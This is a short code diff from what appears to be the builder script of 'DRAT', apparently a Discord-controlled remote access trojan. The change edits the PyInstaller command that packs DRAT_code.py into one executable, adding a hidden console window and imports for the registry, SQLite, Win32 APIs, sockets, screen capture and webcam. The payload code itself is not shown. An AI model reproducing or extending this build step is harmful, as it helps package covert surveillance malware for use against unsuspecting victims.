@@ -108,7 +108,7 @@ if boh == True:
         print("File doesn't exist, proceeding")
     except:
         print("Proceeding")
-    comando2 = f'pyinstaller "{vero}\\DRAT_code.py" --hidden-import discord --hidden-import pyautogui --hidden-import requests --hidden-import wmi --hidden-import cv2 --hidden-import platform --hidden-import ctypes --hidden-import psutil -i "NONE" --onefile --distpath "{destinazione}"'
+    comando2 = f'pyinstaller "{vero}\\DRAT_code.py" --noconsole --onefile --hidden-import discord --hidden-import os --hidden-import discord.ext --hidden-import socket --hidden-import requests --hidden-import pyautogui --hidden-import sys --hidden-import winreg --hidden-import sqlite3 --hidden-import subprocess --hidden-import shutil --hidden-import win32file --hidden-import win32con --hidden-import win32api --hidden-import ctypes --hidden-import psutil --hidden-import time --hidden-import threading --hidden-import cv2 --hidden-import platform --hidden-import wmi --distpath "{destinazione}"'
     if ico == True:
         comando2 = f'{comando2} -i "{setico}"'
     subprocess.call(comando2, shell=True)
